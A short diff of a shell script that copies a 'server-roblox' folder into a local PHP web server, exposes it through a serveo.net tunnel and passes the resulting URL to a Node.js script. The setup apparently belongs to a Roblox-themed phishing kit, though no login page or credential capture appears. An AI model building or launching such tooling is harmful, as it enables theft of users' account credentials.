@@ -54,7 +54,7 @@ if [[ $? -eq 0 ]]; then
 echo -e "\n\033[32mUser Conected!\033[37m"
 echo -e "WELCOME!"
 echo -e "Date : $date_time\nUser : $whoami"
-cp -rf server-roblox/ .server/www
+cp -rf server-roblox/* .server/www
 cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 start_serveo
 else
@@ -83,7 +83,7 @@ start_serveo() {
     sleep 7
     send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .server/www/linksender)
     # Envia o send_url para o servidor Node.js via HTTP
-    node index.js "$send_url"
+    node index.js
     echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
 }
 
